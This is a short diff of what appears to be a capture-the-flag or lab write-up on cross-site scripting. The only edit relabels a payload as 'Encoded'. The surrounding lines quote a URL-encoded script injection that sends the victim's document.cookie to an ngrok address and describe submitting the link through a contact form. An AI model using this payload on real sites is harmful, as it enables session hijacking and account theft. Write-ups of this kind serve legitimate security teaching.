@@ -62,7 +62,7 @@ Now we just have to move to the **Contact** section to submit our malicious link
 
 There's one more problem we have to deal with. When we submit, the page quickly directs to our site so we can't have enough time to "collect" the URL. We should decode our payload ([Use this!](https://www.urlencoder.org/) and set **number** param with decoded value for creating our own links.
 
-Decoded payload:
+Encoded payload:
 ```
 %27%3B%20document.location%3D%22http%3A%2F%2Fefcf-113-161-77-200.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie%3B%20var%20nothing%3D%20%27
 ```
